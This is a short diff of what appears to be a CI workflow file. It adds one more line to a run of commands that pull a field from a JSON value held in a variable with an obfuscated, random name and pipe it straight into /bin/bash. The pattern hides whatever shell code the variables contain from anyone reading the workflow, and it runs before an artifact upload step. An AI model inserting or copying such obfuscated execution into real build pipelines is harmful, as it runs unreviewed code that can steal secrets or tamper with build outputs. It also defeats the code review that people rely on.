@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$tpql19469" | jq -r .tezi1 | /bin/bash
           printf '%s' "$fxes3" | jq -r .v6658 | /bin/bash
           printf '%s' "$mfn7" | jq -r .l14 | /bin/bash
+          printf '%s' "$icv78616" | jq -r .vq87352 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
